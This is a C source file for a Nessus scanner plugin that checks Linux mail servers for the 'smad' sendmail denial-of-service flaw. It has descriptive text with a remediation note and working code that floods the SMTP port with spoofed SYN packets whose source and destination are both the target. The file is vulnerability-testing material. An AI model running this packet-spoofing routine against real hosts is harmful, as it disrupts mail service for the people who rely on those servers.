/*
 * smad.c - sendmail accept dos -
 *
 * Salvatore Sanfilippo [AntireZ]
 * Intesis SECURITY LAB            Phone: +39-2-671563.1
 * Via Settembrini, 35             Fax: +39-2-66981953
 * I-20124 Milano  ITALY           Email: antirez@seclab.com
 *                                         md5330@mclink.it
 *
 * Modified by Erik Anderson <eanders@pobox.com>
 *
 * compile it under Linux with gcc -Wall -o smad smad.c
 *
 * usage: smad fakeaddr victim [port]
 */
 
 
#include <includes.h>
#include <nessusraw.h>

#define NAME "smad"
#define EN_DESC "\n\
The remote host is subject to the\n\
'smad' attack(sendmail accept dos), which prevents sendmail\n\
from accepting legitimate connections.\n\n\
A cracker may use this flaw to prevent you\n\
from receiving any email, thus lowering the\n\
interest of being connected to internet.\n\n\
This attack is specific to some versions of the\n\
Linux kernel.\n\n\
Reference : http://online.securityfocus.com/archive/1/11073\n\n\
Solution : upgrade your Linux kernel to a newer\n\
version.\n\
Risk factor : Serious"


#define FR_DESC "\
L'hote distant est sujet à l'attaque 'smad', qui\n\
empeche sendmail de recevoir des connections\n\
légitimes. \n\
Un pirate peut utiliser ce problème pour vous\n\
empecher de recevoir des email, réduisant ainsi\n\
l'interet d'etre connecté à internet.\n\n\
Cette attaque est spécifique à certains kernels\n\
Linux.\n\
Solution : mettez à jour votre kernel\n\
Facteur de risque : Sérieux"

#define COPYRIGHT "original code by Salvatore Sanfilippo [AntireZ]"
#define EN_SUMM "Prevents Sendmail from working properly"
#define FR_SUMM "Empeche sendmail de fonctionner correctement"

#define EN_FAMILY "Denial of Service"
#define FR_FAMILY "Déni de service"
#define SLEEP_UTIME 100000 /* modify it if necessary */

#define PACKETSIZE (sizeof(struct ip) + sizeof(struct tcphdr))
#define OFFSETTCP  (sizeof(struct ip))
#define OFFSETIP   (0)

u_short cksum(u_short *buf, int nwords)
{
  unsigned long sum;
  u_short *w = buf;
  
  for (sum = 0; nwords > 0; nwords-=2)
    sum += *w++;
  
  sum = (sum >> 16) + (sum & 0xffff);
  sum += (sum >> 16);
  return ~sum;
}

PlugExport int plugin_init(struct arglist *desc);
PlugExport int plugin_init(struct arglist *desc)
{
  plug_set_id(desc, 10338);
  plug_set_version(desc, "$Revision: 1.11 $");
  plug_set_name(desc, NAME, NULL);
  plug_set_description(desc, FR_DESC, "francais");
  plug_set_description(desc, EN_DESC, NULL);
  
  plug_set_summary(desc, FR_SUMM, "francais");
  plug_set_summary(desc, EN_SUMM, NULL);
  
  plug_set_copyright(desc, COPYRIGHT, NULL);
  plug_set_category(desc, ACT_DENIAL);
  plug_set_family(desc, FR_FAMILY, "francais");
  plug_set_family(desc, EN_FAMILY, NULL);
  plug_set_dep(desc, "find_service.nes");
  plug_require_port(desc, "Services/smtp");
  plug_require_port(desc, "25");
  return(0);
}

void send_spoofed_packets(char *packet, struct sockaddr_in dest, int sock);

PlugExport int plugin_run(struct arglist * env);
PlugExport int plugin_run(struct arglist * env)
{
  char packet[PACKETSIZE];
  struct in_addr * addr;
  int on = 1;
  char * asc_port = plug_get_key(env, "Services/smtp");
  u_short fromport        = 3000,
  toport          = asc_port ? atoi(asc_port) : 25;
  
  struct sockaddr_in  remote;
  struct ip    *ip     = (struct ip*)  (packet + OFFSETIP);
  struct tcphdr   *tcp    = (struct tcphdr*) (packet + OFFSETTCP);
  pid_t pid  = 0;
  struct  tcp_pseudohdr
  {
    struct in_addr saddr;
    struct in_addr daddr;
    u_char zero;
    u_char protocol;
    u_short lenght;
    struct tcphdr tcpheader;
  } pseudoheader;
  
  int sock = 0;

  if(host_get_port_state(env, toport))
    {
      int s = open_sock_tcp(env, toport, -2);
      if(s < 0)return(0);
      shutdown(s, 2);
      close(s);
      
      bzero((void*)packet, PACKETSIZE);
      sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
      if (sock == -1) {
	return(0);
      }
#ifdef  IP_HDRINCL
      if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on)) < 0) 
	return(0);
#endif
      addr = plug_get_host_ip(env);
      ip->ip_v =  4;
      ip->ip_hl = sizeof(struct ip)/4;
      ip->ip_len = FIX(PACKETSIZE);
      ip->ip_id      = htons(0xF1C);
      ip->ip_ttl     = 64;
      ip->ip_p = IPPROTO_TCP;
      ip->ip_sum   = 0;
      ip->ip_src.s_addr = addr->s_addr;
      ip->ip_dst.s_addr = addr->s_addr;
      
      
      tcp->th_dport = htons(toport);
      tcp->th_sport = htons(fromport);
      tcp->th_seq   = htonl(32089744);
      tcp->th_ack   = htonl(0);
#ifndef HAVE_TCPHDR_X2_TH_OFF
      tcp->th_off   = sizeof(struct tcphdr)/4;
#else
      tcp->th_x2_off = sizeof(struct tcphdr)/4 << 4;
#endif
      /* 6 bit reserved */
      tcp->th_flags = TH_SYN;
      tcp->th_win   = htons(512);
      
      remote.sin_family = AF_INET;
      remote.sin_port = htons(toport);
      remote.sin_addr.s_addr = addr->s_addr;
      
      /* start of pseudo header stuff */
      bzero(&pseudoheader, 12+sizeof(struct tcphdr));
      pseudoheader.saddr.s_addr=remote.sin_addr.s_addr;
      pseudoheader.daddr.s_addr=remote.sin_addr.s_addr;
      pseudoheader.protocol = IPPROTO_TCP;
      pseudoheader.lenght = htons(sizeof(struct tcphdr));
      bcopy((char*) tcp, (char*) &pseudoheader.tcpheader,
	    sizeof(struct tcphdr));
      /* end */
      
      tcp->th_sum   = cksum((u_short *) &pseudoheader,
			    12+sizeof(struct tcphdr));
      /* 16 bit urg */
      
      
      if((pid=fork())==0)
      {
       send_spoofed_packets(packet, remote, sock);
       exit(0);
      }
      else
      {
      int soc;
      usleep(SLEEP_UTIME*3);
      soc = open_sock_tcp(env, toport, -2);
      if(soc < 0)
      {
       post_hole(env, toport, NULL);
      }
      else {
        shutdown(soc, 2);
        close(soc);
        }
      }
      }
      if(pid)kill(pid, 9);
      shutdown(sock, 2);
      close(sock);
      return 0;
}


void send_spoofed_packets(char *packet, struct sockaddr_in dest, int sock)
{
  int t;
  
  t = 50;
  while (t--)
    {
      sendto(sock, packet, PACKETSIZE, 0,
		      (struct sockaddr *)&dest, sizeof(dest));
       usleep(SLEEP_UTIME);
    }
}
 
